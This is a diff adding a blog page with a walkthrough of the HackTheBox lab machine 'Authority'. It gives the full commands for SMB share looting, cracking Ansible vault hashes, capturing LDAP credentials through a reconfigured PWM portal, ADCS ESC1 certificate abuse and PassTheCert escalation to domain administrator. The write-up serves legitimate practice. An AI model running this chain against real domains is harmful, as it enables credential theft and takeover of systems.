@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Authority - Machine HackTheBox</title>
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    <link rel="stylesheet" type="text/css" href="/css/blog.css">
+</head>
+<body>
+    <div class="container">
+        <div class="article-content">
+            <h2>Authority - Machine HackTheBox</h2>
+            <p>IP: 10.10.11.222<br>Machine Name: Authority<br>Difficulty: Medium
+<br><br>We start with a scan using Nmap:<br></p>
+<code>sudo nmap --min-rate 5000 -sS -n -vvv -Pn 10.10.11.222 -oN scan_ports_tcp</code><br><br>
+<img src="ports.png" alt="ports" style="max-width: 100%; height: auto;">
+<p>I saw several ports; I started by enumerating port 445 (SMB). I used crackmapexec to perform the domain enumeration, and through this process, I got "authority.htb":</p>
+<code>crackmapexec smb 10.10.11.222</code><br><br>
+<img src="crackmapexec.png" alt="crackmapexec" style="max-width: 100%; height: auto;">
+<p>I added this to my /etc/hosts file.</p>
+<code>echo "10.10.11.222 authority.htb" | sudo tee -a /etc/hosts</code>
+<p>Subsequently, I chose to enumerate the shared resources, since no credentials were required to perform this task.</p>
+<code>smbclient -L //authority.htb/ -N</code><br><br>
+<img src="development_resource.png" alt="development resource" style="max-width: 100%; height: auto;">
+<p>The "development" resource caught my attention. I created a mount point in /mnt to work more comfortably.</p>
+<code>sudo mkdir /mnt/development<br>sudo mount -t cifs //authority.htb/development /mnt/development -o user=,pass=</code>
+<p>So, I simply went to the "/mnt/development" directory. There were several folders, and I went to "/mnt/development/Automation/Ansible". When going through various folders, I usually filter by terms such as "user", "username", "pass", "password", "admin", "domain name" and a few other words. When filtering by "password", I got the following:</p>
+<code>grep -ri "password" .</code><br><br>
+<img src="filter_password.png" alt="filter password" style="max-width: 100%; height: auto;">
+<p>I also noticed something related to "ansible-vault". However, I didn't want to go through file by file, so I simply displayed the name of each file with the "-l" flag and passed an xargs cat to read each one. This gave me the following information:</p>
+<code>grep -ril "password" . | xargs cat</code><br><br>
+<img src="ansible_vault.png.png" alt="Ansible Vault" style="max-width: 100%; height: auto;">
+<p>That file would be found in "/mnt/development/Automation/Ansible/PWM/defaults/main.yml". To get a hash, I used "ansible2john" as follows:</p>
+<code>/usr/share/john/ansible2john.py /mnt/development/Automation/Ansible/PWM/defaults/main.yml > main.yml</code>
+<p>I looked at three hashed passwords and noticed that two hashes shared the same password. The contents of my "ldap_hash" variable are as follows:</p>
+<pre><code>$ANSIBLE_VAULT;1.1;AES256 
+63303831303534303266356462373731393561313363313038376166336536666232626461653630
+3437333035366235613437373733316635313530326639330a643034623530623439616136363563
+34646237336164356438383034623462323531316333623135383134656263663266653938333334
+3238343230333633350a646664396565633037333431626163306531336336326665316430613566
+3764
+</code></pre>
+<p>Subsequently</p>
+<pre><code>/usr/share/john/ansible2john.py ldap_hash > ldap_hash.hash<br>john -w:/usr/share/wordlists/rockyou.txt ldap_hash.hash</code></pre>
+<p>Bingo! The password is "!@#$%^&*".<br><br>I needed to use Ansible, so I proceeded to install it.</p>
+<code>pip install ansible</code>
+<p>I decrypted both files corresponding to the Ansible hashes and got the following:</p>
+<img src="decrypt.png" alt="decrypt" style="max-width: 100%; height: auto;">
+<p>However, I did not find a valid use for the password in general. However, I did find a valid use for it in the "pwm_admin_password", since I had the corresponding user. I realized that I could use the same password.</p>
+<pre>
+<code>
+$ANSIBLE_VAULT;1.1;AES256
+31356338343963323063373435363261323563393235633365356134616261666433393263373736
+3335616263326464633832376261306131303337653964350a363663623132353136346631396662
+38656432323830393339336231373637303535613636646561653637386634613862316638353530
+3930356637306461350a316466663037303037653761323565343338653934646533663365363035
+6531
+</code>
+</pre>
+<p>So I have the user "svc_pwm" and the password "pWm_@dm!N_!23". At this point, I decided to go to port "8443", which was associated with "pwm", a self-service web portal for any LDAP user accounts.</p>
+<img src="pwm_access.png" alt="pwm access" style="max-width: 100%; height: auto;">
+<p>The credentials did not work initially, however, they did work in the "Configuration Manager". I simply entered the password and, in this case, the password did work!</p>
+<br><p>Later, I realized that they were also valid in the "Configuration Editor". While in the editor, I scrolled to this section:</p>
+<img src="configuration_editor.png" alt="configuration editor" style="max-width: 100%; height: auto;">
+<p>Then, I simply changed "ldaps" to "ldap", listening on the default port and pointing to my IP address. This was done in order for LDAP authentication to be done to me:</p>
+<img src="edit_configuration.png" alt="edit configuration" style="max-width: 100%; height: auto;">
+<p>We put ourselves in listening mode by "responder":</p>
+<pre>
+<code>
+sudo responder -I tun0
+</code>
+</pre>
+<p>Subsequently, I clicked on "Test LDAP Profile". The authentication should come up and get the credentials of the user "svc_ldap".</p>
+<br>
+<p>Since WinRM was open on the default port 5985, I connected using "evil-winrm" with the credentials obtained.</p>
+<pre>
+<code>
+evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
+</code>
+</pre>
+<p>After a period of enumeration, listing ADCS in an AD can sound good, I proceeded to list ADCS. Active Directory Certificate Services (ADCS) is a set of services in the Microsoft Windows Server environment that enable the organization, creation, distribution and centralized management of digital certificates. These digital certificates are essential for establishing secure authentication.</p> 
+<pre><code>certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -vulnerable -text -stdout</pre></code>
+<p>At the bottom, I can see that it has detected that the "CorpVPN" template is vulnerable to "ESC1":</p>
+<img src="ADCS.png" alt="esc1 vulnerable" style="max-width: 100%; height: auto;"><br><br>
+<img src="ADCS_info.png" alt="ADCS Info" style="max-width: 100%; height: auto;">
+<p>To exploit this vulnerability, I will first create a computer in the domain:</p>
+<pre>
+<code>
+impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name computerfismathack$ -computer-pass password
+</code>
+</pre>
+<p>After creating the computer in the domain, I will request a certificate using the newly created computer account:</p>
+<pre>
+<code>
+echo "10.10.11.222 authority.authority.htb" | sudo tee -a /etc/hosts
+certipy req -u 'computerfismathack$' -p 'password' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dc-ip 10.10.11.222 -dns authority.authority.htb
+</code>
+</pre>
+<p>Subsequently, we will create two new certificates, one without private key and the other without including the certificate.</p>
+<pre>
+<code>
+certipy cert -pfx administrator_authority.pfx -nokey -out authority.crt
+certipy cert -pfx administrator_authority.pfx -nocert -out authority.key
+</code>
+</pre>
+<p>I will make use of "PassTheCert", for this, I proceed to install it:</p>
+<pre>
+<code>
+wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py
+</code>
+</pre>
+<p>Subsequently</p>
+<pre>
+<code>
+python3 passthecert.py -action ldap-shell -crt authority.crt -key authority.key -domain authority.htb -dc-ip 10.10.11.222
+</code>
+</pre>
+<p>Being inside the LDAP shell, I run the following command, which indicates that I want to add the user "svc_ldap" to the "Administrators" group:</p>
+<pre>
+<code>
+add_user_to_group svc_ldap Administrators
+</code>
+</pre>
+<p>Now, you are an administrator with the user "svc_ldap".</p>
+
+
+<br><br><br><br><br><br>
+
+<br><p>Do you have any questions or experience any problems trying to solve the machine? Contact me on Discord or just talk to me for a chat! I'm available to chat :).</p><code>FisMatHack#3733</code>
+<p>Thanks for reading :)</p>
+<br><br><br><br><br><br>
+        </div>
+    </div>
+    <div class="donate-banner">
+    <p>Do you like my content?</p>
+    <p class="donation-text">Could you help me by donating a book?</p>
+<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="fismathack" data-color="#00ff80" data-emoji="📖"  data-font="Cookie" data-text="Buy me a book" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#FFDD00" ></script></div>
+
+</body>
+</html>
+
+
